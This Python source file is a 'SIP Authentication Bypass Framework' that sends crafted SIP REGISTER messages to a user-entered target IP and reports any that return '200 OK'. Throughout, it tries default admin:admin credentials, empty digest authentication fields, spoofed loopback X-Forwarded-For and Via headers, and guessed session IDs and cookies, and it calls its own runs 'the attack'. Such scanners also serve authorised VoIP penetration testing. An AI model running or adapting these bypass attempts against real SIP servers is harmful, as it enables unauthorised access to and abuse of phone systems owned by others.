import os
import socket
import threading
import time
import sys
from datetime import datetime
from tabulate import tabulate
from tqdm import tqdm
import termios
import tty
import select
from concurrent.futures import ThreadPoolExecutor, as_completed

class SipBypassFramework:
    def __init__(self, target_ip, port=5060):
        self.target_ip = target_ip
        self.port = port
        self.results = []
        self.timeout = 5
        self.user_agent = "SipBypassFramework/1.0"
        
    def create_sip_message(self, method="REGISTER", headers=None, body=None):
        """Create a SIP message with optional custom headers"""
        if headers is None:
            headers = {}
            
        message = f"{method} sip:{self.target_ip} SIP/2.0\r\n"
        message += f"Via: SIP/2.0/UDP {socket.gethostbyname(socket.gethostname())}:{self.port};branch=z9hG4bK-{int(time.time())}\r\n"
        message += f"From: <sip:test@{self.target_ip}>;tag={int(time.time())}\r\n"
        message += f"To: <sip:test@{self.target_ip}>\r\n"
        message += f"Call-ID: {int(time.time())}@{self.target_ip}\r\n"
        message += f"CSeq: 1 {method}\r\n"
        message += f"User-Agent: {self.user_agent}\r\n"
        
        for header, value in headers.items():
            message += f"{header}: {value}\r\n"
            
        if body:
            message += f"Content-Length: {len(body)}\r\n\r\n"
            message += body
        else:
            message += "Content-Length: 0\r\n\r\n"
            
        return message

    def send_sip_message(self, message):
        """Send SIP message and receive response"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(message.encode(), (self.target_ip, self.port))
            response, _ = sock.recvfrom(4096)
            sock.close()
            return response.decode()
        except Exception as e:
            print(f"Error sending message: {str(e)}")
            return None

class SipBypassScanner:
    def __init__(self, target_ip=None, port=5060, threads=10, verbose=0):
        self.target_ip = target_ip
        self.port = port
        self.threads = threads
        self.verbose = verbose
        self.exit_event = threading.Event()
        self.results_lock = threading.Lock()
        self.found_bypasses = []
        self.from_ip = None
        self.from_user = None
        self.to_user = None
        self.user_agent = None
        self.selected_methods = []
        self.timeout = 5
        
        # Load configuration
        self.load_config()
        # Load bypass method configs
        self.load_all_bypass_configs()

    def load_config(self):
        """Load main configuration from config file"""
        config_path = os.path.join(os.path.dirname(__file__), 'config', 'config.txt')
        try:
            with open(config_path, 'r') as f:
                for line in f:
                    if '::' in line:
                        key, value = line.strip().split('::', 1)
                        if hasattr(self, key):
                            # Convert value to appropriate type
                            if key in ['port', 'threads', 'verbose', 'timeout']:
                                value = int(value)
                            setattr(self, key, value)
        except Exception as e:
            print(f"Error loading config: {str(e)}")
            sys.exit(1)

    def load_bypass_method_config(self, method_name):
        """Load configuration for a specific bypass method"""
        config_path = os.path.join(
            os.path.dirname(__file__),
            'config',
            'bypass_methods',
            f'{method_name}.txt'
        )
        
        config = {}
        try:
            with open(config_path, 'r') as f:
                for line in f:
                    if '::' in line:
                        key, value = line.strip().split('::', 1)
                        config[key] = value.lower() == 'true'
        except Exception as e:
            if self.verbose > 0:
                print(f"Error loading {method_name} config: {str(e)}")
        
        return config

    def load_all_bypass_configs(self):
        """Load all bypass method configurations"""
        self.header_config = self.load_bypass_method_config('header_manipulation')
        self.auth_schemes_config = self.load_bypass_method_config('auth_schemes')
        self.digest_auth_config = self.load_bypass_method_config('digest_auth')
        self.session_hijack_config = self.load_bypass_method_config('session_hijacking')

    def get_key(self):
        """Get a single keypress from the terminal."""
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(sys.stdin.fileno())
            if select.select([sys.stdin], [], [], 0.1)[0]:
                key = sys.stdin.read(1)
                return key
            return None
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

    def check_for_space_stop(self):
        """Check if space bar was pressed to stop the scan"""
        key = self.get_key()
        if key == ' ':  # Space bar
            return True
        return False

    def create_sip_message(self, method="REGISTER", headers=None, body=None):
        """Create a SIP message with optional custom headers"""
        if headers is None:
            headers = {}
            
        message = f"{method} sip:{self.target_ip} SIP/2.0\r\n"
        message += f"Via: SIP/2.0/UDP {self.from_ip or socket.gethostbyname(socket.gethostname())}:{self.port};branch=z9hG4bK-{int(time.time())}\r\n"
        message += f"From: <sip:{self.from_user}@{self.target_ip}>;tag={int(time.time())}\r\n"
        message += f"To: <sip:{self.to_user}@{self.target_ip}>\r\n"
        message += f"Call-ID: {int(time.time())}@{self.target_ip}\r\n"
        message += f"CSeq: 1 {method}\r\n"
        message += f"User-Agent: {self.user_agent}\r\n"
        
        for header, value in headers.items():
            message += f"{header}: {value}\r\n"
            
        if body:
            message += f"Content-Length: {len(body)}\r\n\r\n"
            message += body
        else:
            message += "Content-Length: 0\r\n\r\n"
            
        return message

    def send_sip_message(self, message):
        """Send SIP message and receive response"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(message.encode(), (self.target_ip, self.port))
            response, _ = sock.recvfrom(4096)
            sock.close()
            return response.decode()
        except Exception as e:
            if self.verbose > 1:
                print(f"Error sending message: {str(e)}")
            return None

    def test_header_manipulation(self):
        """Test various header manipulation techniques"""
        if not self.header_config:
            return False
        
        tests = []
        
        # Basic Auth Tests
        if self.header_config.get('basic_auth'):
            tests.append({"Authorization": "Basic YWRtaW46YWRtaW4="})
        if self.header_config.get('basic_auth_long'):
            tests.append({"Authorization": "Basic " + "A" * 100})
        
        # Digest Auth Tests
        if self.header_config.get('digest_auth'):
            tests.append({"Authorization": "Digest username=\"admin\""})
        if self.header_config.get('digest_auth_partial'):
            tests.append({"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\""})
        
        # IP Spoofing Tests
        if self.header_config.get('ip_spoofing'):
            tests.append({"X-Forwarded-For": "127.0.0.1"})
        if self.header_config.get('x_real_ip'):
            tests.append({"X-Real-IP": "127.0.0.1"})
        
        # Via Header Tests
        if self.header_config.get('via_header'):
            tests.append({"Via": "SIP/2.0/UDP 127.0.0.1:5060"})
        if self.header_config.get('via_ipv6'):
            tests.append({"Via": "SIP/2.0/UDP [::1]:5060"})
        
        for test in tests:
            if self.exit_event.is_set():
                break
                
            message = self.create_sip_message(headers=test)
            response = self.send_sip_message(message)
            
            if response and "200 OK" in response:
                with self.results_lock:
                    self.found_bypasses.append(("Header Manipulation", test, response))
                return True
                
        return False

    def test_auth_schemes(self):
        """Test different authentication schemes"""
        if not self.auth_schemes_config:
            return False
        
        tests = []
        
        # Standard Schemes
        if self.auth_schemes_config.get('basic'):
            tests.append({"Authorization": "Basic "})
        if self.auth_schemes_config.get('digest'):
            tests.append({"Authorization": "Digest "})
        if self.auth_schemes_config.get('bearer'):
            tests.append({"Authorization": "Bearer "})
        if self.auth_schemes_config.get('ntlm'):
            tests.append({"Authorization": "NTLM "})
        if self.auth_schemes_config.get('negotiate'):
            tests.append({"Authorization": "Negotiate "})
        
        # Additional Schemes
        if self.auth_schemes_config.get('oauth'):
            tests.append({"Authorization": "OAuth "})
        if self.auth_schemes_config.get('aws4'):
            tests.append({"Authorization": "AWS4-HMAC-SHA256 "})
        if self.auth_schemes_config.get('custom'):
            tests.append({"Authorization": "Custom "})
        if self.auth_schemes_config.get('none'):
            tests.append({"Authorization": "None"})
        if self.auth_schemes_config.get('empty'):
            tests.append({"Authorization": ""})
        
        for test in tests:
            if self.exit_event.is_set():
                break
            
            message = self.create_sip_message(headers=test)
            response = self.send_sip_message(message)
            
            if response and "200 OK" in response:
                with self.results_lock:
                    self.found_bypasses.append(("Auth Schemes", test, response))
                return True
            
        return False

    def test_digest_auth(self):
        """Test digest authentication weaknesses"""
        if not self.digest_auth_config:
            return False
        
        tests = []
        
        # Empty Digest
        if self.digest_auth_config.get('empty_digest'):
            tests.append({"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"\", response=\"\""})
        
        # Algorithm Tests
        if self.digest_auth_config.get('algorithm_md5'):
            tests.append({"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"\", response=\"\", algorithm=\"MD5\""})
        if self.digest_auth_config.get('algorithm_sha256'):
            tests.append({"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"\", response=\"\", algorithm=\"SHA-256\""})
        
        # QoP Tests
        if self.digest_auth_config.get('qop_auth'):
            tests.append({"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"\", response=\"\", qop=\"auth\""})
        if self.digest_auth_config.get('qop_auth_int'):
            tests.append({"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"\", response=\"\", qop=\"auth-int\""})
        
        for test in tests:
            if self.exit_event.is_set():
                break
            
            message = self.create_sip_message(headers=test)
            response = self.send_sip_message(message)
            
            if response and "200 OK" in response:
                with self.results_lock:
                    self.found_bypasses.append(("Digest Auth", test, response))
                return True
            
        return False

    def test_session_hijacking(self):
        """Test session hijacking techniques"""
        if not self.session_hijack_config:
            return False
        
        tests = []
        
        # Session ID Tests
        if self.session_hijack_config.get('session_id'):
            tests.append({"Session-ID": "123456789"})
        if self.session_hijack_config.get('session_id_zero'):
            tests.append({"Session-ID": "0"})
        
        # Cookie Tests
        if self.session_hijack_config.get('cookie_session'):
            tests.append({"Cookie": "session=123456789"})
        if self.session_hijack_config.get('cookie_sip_session'):
            tests.append({"Cookie": "sip_session=123456789"})
        
        # Custom Session Tests
        if self.session_hijack_config.get('x_session_id'):
            tests.append({"X-Session-ID": "123456789"})
        if self.session_hijack_config.get('x_auth_token'):
            tests.append({"X-Auth-Token": "123456789"})
        
        for test in tests:
            if self.exit_event.is_set():
                break
            
            message = self.create_sip_message(headers=test)
            response = self.send_sip_message(message)
            
            if response and "200 OK" in response:
                with self.results_lock:
                    self.found_bypasses.append(("Session Hijacking", test, response))
                return True
            
        return False

    def start_scan(self):
        """Start the bypass scanning process"""
        print(f"\nStarting bypass attempts against {self.target_ip}:{self.port}")
        print("Press SPACE to stop the attack")
        
        tests = []
        
        # Add selected methods to tests
        for method_name, method_func in self.selected_methods:
            if method_func == "all":
                # Add all methods
                tests.extend([
                    ("Header Manipulation", self.test_header_manipulation),
                    ("Auth Schemes", self.test_auth_schemes),
                    ("Digest Auth", self.test_digest_auth),
                    ("Session Hijacking", self.test_session_hijacking)
                ])
                break
            else:
                # Add specific method
                tests.append((method_name, getattr(self, method_func)))
        
        if not tests:
            print("No methods selected for testing")
            return False
        
        total_tests = len(tests)
        with tqdm(total=total_tests, desc="Testing bypass methods") as pbar:
            for test_name, test_func in tests:
                if self.exit_event.is_set():
                    break
                    
                if self.check_for_space_stop():
                    print("\nStopping scan...")
                    self.exit_event.set()
                    break
                    
                if test_func():
                    print(f"\nFound potential bypass: {test_name}")
                    
                pbar.update(1)
                
        if self.found_bypasses:
            print("\nFound bypasses:")
            for bypass_type, details, response in self.found_bypasses:
                print(f"\n{bypass_type}:")
                print(f"Details: {details}")
                print(f"Response: {response[:200]}...")  # Show first 200 chars of response
        else:
            print("\nNo bypasses found")
            
        if self.exit_event.is_set():
            print("\nScan stopped by user")
            
        return bool(self.found_bypasses)

class HeaderManipulationBypass(SipBypassFramework):
    """
    Header Manipulation Bypass:
    This method exploits vulnerabilities in how SIP servers handle various headers. It tests for weaknesses in
    authentication headers, IP spoofing possibilities, and Via header manipulation. The technique works by
    sending specially crafted headers that might trick the server into bypassing authentication checks or
    accepting requests from unauthorized sources.
    """
    def test_basic_auth(self):
        tests = [
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
            {"Authorization": "Basic " + "A" * 100},      # Long basic auth
            {"Authorization": "Basic "}                    # Empty basic auth
        ]
        return self._run_tests(tests, "Basic Auth")

    def test_digest_auth(self):
        tests = [
            {"Authorization": "Digest username=\"admin\""},
            {"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\""}
        ]
        return self._run_tests(tests, "Digest Auth")

    def test_ip_spoofing(self):
        tests = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"Via": "SIP/2.0/UDP 127.0.0.1:5060"}
        ]
        return self._run_tests(tests, "IP Spoofing")

    def _run_tests(self, tests, test_type):
        """Run a set of tests and record results"""
        for test in tests:
            message = self.create_sip_message(headers=test)
            response = self.send_sip_message(message)
            
            if response and "200 OK" in response:
                self.results.append({
                    "type": test_type,
                    "test": test,
                    "response": response
                })
                return True
        return False

class AuthSchemeBypass(SipBypassFramework):
    """
    Authentication Scheme Bypass:
    This method tests various authentication schemes that might be supported by the SIP server. It attempts
    to bypass authentication by trying different authentication methods and schemes. The technique works by
    sending requests with various authentication schemes, some of which might be improperly implemented or
    have known vulnerabilities.
    """
    def test_auth_schemes(self):
        tests = [
            {"Authorization": "Basic "},
            {"Authorization": "Digest "},
            {"Authorization": "Bearer "},
            {"Authorization": "NTLM "},
            {"Authorization": "Negotiate "},
            {"Authorization": "OAuth "},
            {"Authorization": "AWS4-HMAC-SHA256 "},
            {"Authorization": "Custom "},
            {"Authorization": "None"},
            {"Authorization": ""}
        ]
        return self._run_tests(tests, "Auth Schemes")

class DigestAuthBypass(SipBypassFramework):
    """
    Digest Authentication Bypass:
    This method focuses on exploiting weaknesses in the Digest Authentication mechanism. It tests for
    vulnerabilities in how the server handles digest parameters, algorithms, and quality of protection
    settings. The technique works by manipulating the digest authentication parameters to exploit
    implementation flaws or weak configurations.
    """
    def test_digest_auth(self):
        tests = [
            {"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"\", response=\"\""},
            {"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"\", response=\"\", algorithm=\"MD5\""},
            {"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"\", response=\"\", algorithm=\"SHA-256\""},
            {"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"\", response=\"\", qop=\"auth\""},
            {"Authorization": "Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"\", response=\"\", qop=\"auth-int\""}
        ]
        return self._run_tests(tests, "Digest Auth")

class SessionHijackingBypass(SipBypassFramework):
    """
    Session Hijacking Bypass:
    This method tests for vulnerabilities in session management and handling. It attempts to hijack
    existing sessions or create unauthorized sessions by manipulating session identifiers, cookies, and
    custom session headers. The technique works by exploiting weaknesses in how the server manages and
    validates session state.
    """
    def test_session_hijacking(self):
        tests = [
            {"Session-ID": "123456789"},
            {"Session-ID": "0"},
            {"Cookie": "session=123456789"},
            {"Cookie": "sip_session=123456789"},
            {"X-Session-ID": "123456789"},
            {"X-Auth-Token": "123456789"}
        ]
        return self._run_tests(tests, "Session Hijacking")

    def _run_tests(self, tests, test_type):
        """Run a set of tests and record results"""
        for test in tests:
            message = self.create_sip_message(headers=test)
            response = self.send_sip_message(message)
            
            if response and "200 OK" in response:
                self.results.append({
                    "type": test_type,
                    "test": test,
                    "response": response
                })
                return True
        return False

def main():
    print("\n=== SIP Authentication Bypass Framework ===")
    print("----------------------------------------")
    
    target_ip = input("Enter target IP: ").strip()
    port = int(input("Enter target port (default 5060): ").strip() or "5060")
    
    # Create bypass instances
    header_bypass = HeaderManipulationBypass(target_ip, port)
    auth_scheme_bypass = AuthSchemeBypass(target_ip, port)
    digest_auth_bypass = DigestAuthBypass(target_ip, port)
    session_hijack_bypass = SessionHijackingBypass(target_ip, port)
    
    # Run all tests
    print("\nRunning Header Manipulation tests...")
    header_bypass.test_basic_auth()
    header_bypass.test_digest_auth()
    header_bypass.test_ip_spoofing()
    
    print("\nRunning Auth Scheme tests...")
    auth_scheme_bypass.test_auth_schemes()
    
    print("\nRunning Digest Auth tests...")
    digest_auth_bypass.test_digest_auth()
    
    print("\nRunning Session Hijacking tests...")
    session_hijack_bypass.test_session_hijacking()
    
    # Display results
    print("\n=== Test Results ===")
    for bypass in [header_bypass, auth_scheme_bypass, digest_auth_bypass, session_hijack_bypass]:
        for result in bypass.results:
            print(f"\nBypass Type: {result['type']}")
            print(f"Test: {result['test']}")
            print(f"Response: {result['response'][:200]}...")

if __name__ == "__main__":
    main() 